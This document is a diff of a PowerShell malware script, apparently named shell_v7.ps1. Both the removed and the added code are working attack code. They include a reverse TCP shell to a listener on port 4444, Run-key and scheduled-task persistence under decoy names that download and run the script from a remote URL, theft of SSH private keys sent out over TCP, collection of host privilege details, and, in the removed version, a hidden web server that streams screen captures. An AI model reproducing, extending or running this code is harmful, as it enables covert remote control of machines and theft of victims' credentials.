@@ -1,27 +1,102 @@
-# shell.ps1 v6 - FULL PATH + BULLETPROOF WEBSERVER
-$a = "System.Net.Sockets."; $b = "TCPClient"; $c = New-Object ($a + $b)("192.168.1.15", 4444); $s = $c.GetStream(); [byte[]]$b_arr = 0..65535|%{0}; 
-$currentPath = (Get-Location).Path; $m = ([text.encoding]::ASCII).GetBytes("CONNECTED: $currentPath`nPS $currentPath > "); 
-$s.Write($m,0,$m.Length);
+# shell_v7.ps1 - Persistence + Backdoor Priority
+# Reliable reverse TCP to 192.168.11.67:4444 + SSH key grab + scheduled task backup
 
-# Persistence
-$regcmd = 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(`"http://192.168.11.67/shell.ps1`")"';
-New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force -ErrorAction SilentlyContinue | Out-Null;
-Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysUpdate' -Value $regcmd -Force -ErrorAction SilentlyContinue;
+# Config
+$LHOST = "192.168.1.15"
+$LPORT = 4444
+$SCRIPT_URL = "https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v7.ps1"
 
-# ULTRA-SIMPLE HTTP SERVER - NO ESCAPING ISSUES
-$httpArgs = @('-nop', '-w', 'hidden', '-c', @'
-$l=New-Object System.Net.HttpListener; $l.Prefixes.Add("http://+:8080/"); $l.Start(); $page="<h1>BACKDOOR</h1><img src=/screen><br><a href=/screen>Refresh</a>"; while($l.IsListening){$ctx=$l.GetContext(); if($ctx.Request.Url.LocalPath -eq "/screen"){Add-Type -A System.Drawing,System.Windows.Forms; $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height); $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location,0,0,$b.Width,$b.Height); $ms=New-Object IO.MemoryStream; $bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg); $ctx.Response.ContentType="image/jpeg"; $ctx.Response.ContentLength64=$ms.Length; $ms.Position=0; $ms.CopyTo($ctx.Response.OutputStream); $ms.Dispose(); $bmp.Dispose(); $g.Dispose()} else {$ctx.Response.ContentType="text/html"; $bytes=[Text.Encoding]::UTF8.GetBytes($page); $ctx.Response.ContentLength64=$bytes.Length; $ctx.Response.OutputStream.Write($bytes,0,$bytes.Length)}; $ctx.Response.Close()}
-'@ -join ';')
-Start-Process powershell -WindowStyle Hidden -ArgumentList $httpArgs
-
-# REVERSE SHELL
-while(($i = $s.Read($b_arr, 0, $b_arr.Length)) -ne 0){
-    $d = [text.encoding]::ASCII.GetString($b_arr,0, $i); 
-    $sb = try { Invoke-Expression $d 2>&1 | Out-String } catch { $_.Exception.Message }; 
-    $currentPath = (Get-Location).Path;
-    $out = $sb + "PS $currentPath > "; 
-    $m = ([text.encoding]::ASCII).GetBytes($out); 
-    $s.Write($m,0,$m.Length); 
-    $s.Flush()
+# Reverse shell function (path prompt fixed)
+function Start-ReverseShell {
+    $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
+    $stream = $client.GetStream()
+    [byte[]]$bytes = 0..65535|%{0}
+    
+    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+        $sendback = (iex $data 2>&1 | Out-String )
+        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+        $stream.Write($sendbyte,0,$sendbyte.Length)
+        $stream.Flush()
+    }
+    $client.Close()
 }
-$c.Close()
+
+# Persistence: Registry HKCU Run
+function Set-RegistryPersistence {
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regName = "SysUpdate"
+    $regValue = "powershell -w hidden -nop -WindowStyle Hidden -c `"IEX(New-Object Net.WebClient).DownloadString('$SCRIPT_URL')`""
+    
+    if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
+        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
+    }
+}
+
+# Backup Persistence: Scheduled Task (runs every 5min)
+function Set-ScheduledTaskPersistence {
+    $taskName = "WindowsUpdateCheck"
+    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -nop -WindowStyle Hidden -c `"IEX(New-Object Net.WebClient).DownloadString('$SCRIPT_URL')`""
+    $taskTrigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
+    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+    
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force | Out-Null
+}
+
+# Backdoor: Grab SSH keys and exfil
+function Grab-SSHKeys {
+    $sshDir = "$env:USERPROFILE\.ssh"
+    $keys = @()
+    
+    if (Test-Path $sshDir) {
+        Get-ChildItem -Path $sshDir -Filter "id_*" -Recurse -File | ForEach-Object { $keys += $_.FullName }
+        if (Test-Path "$sshDir\id_rsa") { $keys += "$sshDir\id_rsa" }
+    }
+    
+    foreach ($key in $keys) {
+        try {
+            $content = Get-Content $key -Raw
+            $exfilData = "SSHKEY|$key`n$content`n---"
+            $tcp = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
+            $stream = $tcp.GetStream()
+            $bytes = [System.Text.Encoding]::ASCII.GetBytes($exfilData)
+            $stream.Write($bytes, 0, $bytes.Length)
+            $stream.Close()
+            $tcp.Close()
+        } catch { }
+    }
+}
+
+# Cred dump
+function Dump-Creds {
+    $creds = @()
+    $creds += "USER: $env:USERNAME"
+    $creds += "HOST: $env:COMPUTERNAME"
+    $creds += "PRIVS: " + (& whoami /priv)
+    $creds += "PATH: $env:PATH"
+    
+    $exfilData = "CREDS`n" + ($creds -join "`n") + "`n---"
+    try {
+        $tcp = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
+        $stream = $tcp.GetStream()
+        $bytes = [System.Text.Encoding]::ASCII.GetBytes($exfilData)
+        $stream.Write($bytes, 0, $bytes.Length)
+        $stream.Close()
+        $tcp.Close()
+    } catch { }
+}
+
+# Main execution
+Start-Job -ScriptBlock { 
+    Set-RegistryPersistence
+    Set-ScheduledTaskPersistence
+    Dump-Creds
+    Grab-SSHKeys
+    Start-Sleep 2
+    Start-ReverseShell
+} | Out-Null
+
+# Keep alive
+while ($true) { Start-Sleep 30 }
